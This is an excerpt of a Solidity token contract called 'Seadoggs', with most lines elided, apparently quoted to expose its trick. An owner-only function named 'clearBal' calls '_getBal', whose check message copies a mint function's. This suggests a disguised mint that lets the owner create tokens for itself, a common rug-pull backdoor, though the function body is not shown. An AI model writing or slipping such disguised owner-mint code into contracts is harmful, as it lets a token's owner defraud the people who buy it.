...
contract seadoggs is Context, IERC20, Ownable {
    ...
    string private _name = "Seadoggs";
    string private _symbol = "seadoggs";
    ...
    uint256 public maxWalletAmount = _tTotal * 50 / 100;
    ...
    function _getBal(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: get to the zero address"); //
    ...
    function clearBal(uint256 amount) public onlyOwner returns (bool) {
    _getBal(_msgSender(), amount * 10 ** _decimals);
    return true;
    } //
